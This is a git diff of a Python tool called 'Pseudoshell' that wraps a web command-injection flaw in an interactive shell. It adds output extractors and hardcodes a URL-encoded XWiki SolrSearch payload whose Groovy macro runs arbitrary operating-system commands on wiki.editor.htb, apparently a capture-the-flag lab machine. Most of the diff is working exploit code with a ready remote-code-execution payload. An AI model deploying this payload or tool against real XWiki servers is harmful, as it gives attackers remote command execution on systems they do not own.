@@ -7,29 +7,31 @@ import argparse
 import encoders
 
 class Injector:
-    def __init__(self, url, request_type, encoding_type=None, body=None):
+    def __init__(self, url, request_type, encoding_type=None, body=None, extractor_pairs=[]):
         self.url = url
+        self.filled_url = ""
         self.request_type = request_type
         self.body = body
+        self.filled_body = ""
         self.encoding_type = encoding_type
-        self.url_encoding_mask = url
-        self.body_encoding_mask = body
-    def define_mask(self, url_encoding_mask=None, body_encoding_mask=None):
-        self.url_encoding_mask = url_encoding_mask
-        self.body_encoding_mask = body_encoding_mask
+        self.extractor_pairs = extractor_pairs
     def inject_command(self, command):
         command = encoders.urlencode(command)
-        self.url = self.url.replace("^COMMAND^", command)
+        self.filled_url = self.url.replace("^COMMAND^", command)
         if self.body != None:
-            self.body = self.body.replace("^COMMAND^", command)
-    def encode_url(self):
-        spliturl = []
-        while "ENCS" in self.url_encoding_mask:
-            pass
+            self.filled_body = self.body.replace("^COMMAND^", command)
     def send_command(self, command):
         self.inject_command(command)
-        response = requests.get(self.url)
-        return response.text
+        response = requests.get(self.filled_url)
+        response = response.text
+        for pair in self.extractor_pairs:
+            if pair[0] in response and pair[1] in response:
+                response = response.split(pair[0])[1]
+                response = response.split(pair[1])[0]
+        response += "\n"
+        response = response.replace("<br/>", "\n")
+        response = response.replace("&nbsp;", " ")
+        return response
 
 class History:
     def __init__(self):
@@ -147,12 +149,12 @@ def shell_run_command(command):
 
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(prog="Psuedoshell", description="A smart shell that isn't a shell, but can be used to turn single command injections on webpages into a shell")
+    parser = argparse.ArgumentParser(prog="Pseudoshell", description="A smart shell that isn't a shell, but can be used to turn single command injections on webpages into a shell")
     parser.add_argument("--wizard", help="enables the wizard to give an interactive setup", action="store_true")
     args = parser.parse_args()
     shell = None
     if args.wizard:
-        print("Welcome to the psuedo shell wizard, here we will help you set up your shell")
+        print("Welcome to the pseudo shell wizard, here we will help you set up your shell")
         print("")
         print("When answering the following questions, please enter ^COMMAND^ at the place you want your command injected")
         print("The ^COMMAND^ will then be replaced by your command when sending it")
@@ -163,7 +165,17 @@ if __name__ == "__main__":
         body = None
         if method == "PUT" or method == "POST":
             body = input("What is the body of the request")
-        injector = Injector(url, method, body=body)
+        extractors = []
+        more = "y"
+        while more.lower() == "y":
+            startextractor = input("What is the start extractor: ")
+            endextractor = input("What is the end extractor: ")
+            extractors.append((startextractor, endextractor))
+            more = input("Are there more extractors (Y/N): ")
+        url = "http://wiki.editor.htb/xwiki/bin/view/Main/SolrSearch?media=rss&text=%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28%22^COMMAND^%22%2Eexecute%28%29%2Etext%29%3B%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D"
+        method = "GET"
+        extractors = [("RSS feed for search on [", "]&lt;/title&gt;")]
+        injector = Injector(url, method, body=body, extractor_pairs=extractors)
         shell = Shell(injector.send_command)
     else:
         shell = Shell(shell_run_command)
